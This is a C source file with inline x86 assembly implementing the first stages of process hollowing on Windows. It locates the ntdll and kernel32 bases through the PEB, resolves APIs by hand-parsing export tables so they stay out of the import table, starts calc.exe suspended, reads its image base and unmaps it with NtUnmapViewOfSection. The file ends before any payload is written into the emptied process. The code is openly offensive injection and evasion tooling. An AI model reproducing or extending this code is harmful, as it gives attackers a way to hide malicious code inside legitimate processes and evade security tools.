#include <windows.h>
#include <stdio.h>
#include "Hollow.h"
#include <subauth.h>

#define DEBUG 

typedef struct _RTL_USER_PROCESS_PARAMETERS {
	BYTE           Reserved1[16];
	PVOID          Reserved2[10];
	UNICODE_STRING ImagePathName;
	UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB_LDR_DATA {
	BYTE       Reserved1[8];
	PVOID      Reserved2[3];
	LIST_ENTRY InMemoryOrderModuleList;
} PEB_LDR_DATA, * PPEB_LDR_DATA;



typedef struct _PEB {
	BYTE                          Reserved1[2];
	BYTE                          BeingDebugged;
	BYTE                          Reserved2[1];
	PVOID                         Reserved3[2];
	PPEB_LDR_DATA                 Ldr;
	PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
	PVOID                         Reserved4[3];
	PVOID                         AtlThunkSListPtr;
	PVOID                         Reserved5;
	ULONG                         Reserved6;
	PVOID                         Reserved7;
	ULONG                         Reserved8;
	ULONG                         AtlThunkSListPtr32;
	PVOID                         Reserved9[45];
	BYTE                          Reserved10[96];
	struct PS_POST_PROCESS_INIT_ROUTINE*  PostProcessInitRoutine;
	BYTE                          Reserved11[128];
	PVOID                         Reserved12[1];
	ULONG                         SessionId;
} PEB, * PPEB;


typedef struct _smPROCESS_BASIC_INFORMATION {
	LONG ExitStatus;
	PPEB PebBaseAddress;
	ULONG_PTR AffinityMask;
	LONG BasePriority;
	ULONG_PTR UniqueProcessId;
	ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION, * PPROCESS_BASIC_INFORMATION;

typedef  BOOL(__stdcall *_CreateProcessA)(LPCSTR,LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL,DWORD , LPVOID , LPCSTR ,LPSTARTUPINFOA ,LPPROCESS_INFORMATION);
typedef  BOOL(__stdcall* _ReadProcessMemory)(HANDLE ,LPCVOID , LPVOID ,SIZE_T ,SIZE_T);
typedef  BOOL(__stdcall* _WriteProcessMemory)(HANDLE,LPVOID,LPCVOID,SIZE_T,SIZE_T);
typedef  HANDLE(__stdcall* _CreateFileA)(LPCSTR,DWORD,DWORD,LPSECURITY_ATTRIBUTES,DWORD,DWORD,HANDLE);
typedef  DWORD(__stdcall* _GetFileSize)(HANDLE, LPDWORD);
typedef  LPVOID(__stdcall* _HeapAlloc)(HANDLE , DWORD, SIZE_T);
typedef BOOL(__stdcall* _ReadFile)(HANDLE,LPVOID,DWORD,LPDWORD,LPOVERLAPPED); 
typedef  NTSTATUS(WINAPI* _NtQueryInformationProcess)(HANDLE , PROCESS_INFORMATION_CLASS,PVOID,ULONG,PULONG);
typedef NTSTATUS(WINAPI* _NtUnmapViewOfSection)(HANDLE, PVOID);


DWORD kernel32_base, ntdll_base; 


void Kernel32_NTdll_bases()
{
	__asm {
		
		xor eax , eax
		mov eax , fs:[eax + 0x30] //PEB
		mov eax , [eax+0xc] // pointer LDR 
		mov eax , [eax+0x14] // InMemoryOrderModuleList
		mov eax , [eax]	 
		mov ecx , [eax+0x10] // image base of ntdll 
		mov [ntdll_base] , ecx
		mov eax , [eax] // kernel32.dll
		mov ecx , [eax+0x10]
		mov [kernel32_base] , ecx // image base of kernel32.dll
		
	}

}

DWORD find_function_address(DWORD base , char * function_name)
{

	__asm {
		/* Virtual addresses to (exported , name , ordinal) tables*/
		mov eax, base
		mov edx, [eax + 0x3c] // RVA PE signature
		add edx, eax // address of PE signature
		mov edx, [edx + 0x78] // RVA of export table  
		/* mov eax , [eax+0x14]  number of exported functions*/
		add edx, eax // address export table
		mov ebx, [edx + 0x1c] // RVA exported functions
		add ebx, eax // EBX  = va of exported functions
		mov esi, [edx + 0x20] // RVA name_pointer_table
		add esi, eax // ESI = va of name_pointer_table
		mov edx, [edx + 0x24] // RVA of ordinal table
		add edx, eax // EDX = va of ordinal table

		/*length function name*/
		push eax /* saving base address on the stack*/
		xor ecx , ecx
		mov edi, function_name
		xor eax, eax
		repp:
		inc ecx
			cmp [edi + ecx], 0
			jz compare_names
			inc ecx
			jmp repp
			/*Function address*/
		
		compare_names:
			cld // Direction flag , process string from left to right
			push esi
			mov esi, [esi + eax * 4]
			add esi, [esp+4]
			push ecx // save value (repe cmpsb change it)
			push edi
			repe cmpsb // is [edi]==[esi] ?
			pop edi
			pop ecx
			pop esi
			jz name_found
			inc eax
			jmp compare_names
		name_found:
			pop esi // base
			mov ax, [edx + eax * 2] // function ordinal
			mov edx , [ebx + eax * 4] // RVA of function
			add edx , esi
		 
		xchg eax , edx
	}
}



int wmain()
{
	Kernel32_NTdll_bases();
	PROCESS_BASIC_INFORMATION pbi ; 
	STARTUPINFOA blah;
	PROCESS_INFORMATION blah1; 
	ZeroMemory(&blah, sizeof(blah));

	_CreateProcessA _CreateProc = find_function_address(kernel32_base, "CreateProcessA");
	if (!_CreateProc(NULL, (LPSTR)"C:\\Windows\\syswow64\\calc.exe", NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &blah, &blah1)) {
		printf("error creating this trash process bye , %d!\n",GetLastError());
		exit(1); 
	}
	HANDLE target = blah1.hProcess;
	ULONG len;
	_NtQueryInformationProcess NtQueryInformationPr= find_function_address(ntdll_base, "NtQueryInformationProcess");
	NTSTATUS status = NtQueryInformationPr(target, 0, &pbi,sizeof(pbi),&len);
	/*	if (NT_ERROR(status)) {
		printf("NtQuery failed !"); 
	}*/
	DWORD pebImageBaseOffset = (DWORD)pbi.PebBaseAddress + 8; 
	LPVOID TargetImageBase = 0;
	SIZE_T bytesRead = NULL;
	_ReadProcessMemory ReadProcessMem = find_function_address(kernel32_base, "ReadProcessMemory"); 
	ReadProcessMem(target, (LPCVOID)pebImageBaseOffset, &TargetImageBase, 4, &bytesRead);
#ifdef DEBUG
	printf("[+] base address of target %x\n", (DWORD)TargetImageBase); 
#endif

	_NtUnmapViewOfSection NtUnmapViewOfSe = find_function_address(ntdll_base, "NtUnmapViewOfSection");
#ifdef DEBUG
	printf("[+] _NtUnmapViewOfSection @ 0x%x\n", (DWORD)NtUnmapViewOfSe);
#endif
	NtUnmapViewOfSe(target,TargetImageBase);

}